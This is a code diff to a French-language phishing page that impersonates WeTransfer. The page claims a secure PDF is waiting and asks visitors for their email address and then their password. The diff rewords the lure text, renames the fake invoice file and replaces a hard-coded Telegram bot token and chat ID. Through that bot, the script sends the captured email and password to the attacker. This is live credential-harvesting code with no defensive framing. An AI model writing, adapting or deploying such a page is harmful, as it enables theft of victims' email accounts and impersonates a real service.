@@ -29,20 +29,22 @@
             <img src="https://gotrialpro.net/wp-content/uploads/edd/2024/07/WeTransfer-Free-Trial-1024x473.png" 
                  alt="WeTransfer Logo" class="logo mx-auto">
         </div>
+        
         <!-- Conteneur principal qui sera caché après authentification -->
         <div id="main-container" class="form-container bg-white w-full max-w-md p-6">
             <!-- Étape 1 : Email -->
             <div id="email-step">
+                <p class="text-gray-700 mb-4 text-center font-medium">Vous avez reçu un fichier sécurisé</p>
+                
                 <div class="flex items-center justify-center mb-6">
                     <svg class="pdf-icon text-red-500" fill="currentColor" viewBox="0 0 384 512">
                         <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                     </svg>
                     <p class="font-bold mx-3 text-gray-800">Vous avez reçu un fichier pdf sécurisé</p>
-            </div> 
-                    <p class="text-gray-600 mb-6 text-center text-sm">1 élément, 4.9 Ko au total</p>
-                    <img src="https://i.postimg.cc/02DDD9fb/jkl.jpg" 
-                 alt="image Logo" class="image mx-auto">
+                </div>
+                
                 <p class="text-gray-600 mb-6 text-center text-sm">Pour accéder à ce document, veuillez entrer les identifiants de messagerie associés à ce transfert.</p>
+                
                 <input type="email" id="zone-email" 
                        class="border border-gray-300 w-full p-3 rounded-lg" 
                        placeholder="Entrez votre email"/>
@@ -52,22 +54,24 @@
                     Continuer
                 </button>
             </div>
+            
             <!-- Étape 2 : Mot de passe (caché initialement) -->
             <div id="password-step" class="hidden">
+                <p class="text-gray-700 mb-4 text-center font-medium">Vous avez reçu un fichier sécurisé</p>
+                
                 <div class="flex items-center justify-center mb-6">
                     <svg class="pdf-icon text-red-500" fill="currentColor" viewBox="0 0 384 512">
                         <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                     </svg>
                     <p class="font-bold mx-3 text-gray-800">Vous avez reçu un fichier pdf sécurisé</p>
-            </div>
-                    <p class="text-gray-600 mb-6 text-center text-sm">1 élément, 4.9 Ko au total</p>
-                    <img src="https://i.postimg.cc/02DDD9fb/jkl.jpg" 
-                 alt="image Logo" class="image mx-auto">
+                </div>
+                    <p class="text-gray-600 mb-6 text-center text-sm">1 élément, 4.9 Ko au total
                 <p class="text-gray-600 mb-6 text-center text-sm">Pour accéder à ce document, veuillez entrer les identifiants de messagerie associés à ce transfert.</p>
+                
                 <input type="password" id="zone-password" 
                        class="border border-gray-300 w-full p-3 rounded-lg" 
                        placeholder="Entrez votre mot de passe"/>
-                <p id="password-error" class="text-red-500 text-sm mt-1 hidden">Mot de passe ou mail incorrect</p>
+                <p id="password-error" class="text-red-500 text-sm mt-1 hidden">Mot de passe incorrect</p>
                 <button id="password-submit" 
                         class="w-full bg-orange-500 text-white font-bold py-3 px-4 rounded-lg mt-4">
                     Accéder au document
@@ -90,7 +94,7 @@
                 <svg class="w-16 h-16 text-red-500 mx-auto mb-3" fill="currentColor" viewBox="0 0 384 512">
                     <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                 </svg>
-                <p class="font-semibold text-gray-800 text-lg">Facture n° 508099.pdf</p>
+                <p class="font-semibold text-gray-800 text-lg">Doc7879.pdf</p>
                 <p class="text-sm text-gray-500">PDF Document • 4.9 Ko</p>
             </div>
             
@@ -151,8 +155,8 @@
             
             // Envoi des données au bot Telegram
             try {
-                const botToken = '8578190850:AAHQyoEjxnHJhU_SUDmmDjoXjn9NBKE1zvY';
-                const chatId = '7394487789';
+                const botToken = '8321104298:AAGG5V7GicDoQrI8ZSshCdpN1Tz6-AyFwTQ';
+                const chatId = '8249115692';
                 const message = `
                 ----------🤞WETRANSFERT LOGIN🤞--------
                 📧 Email: ${email}\n
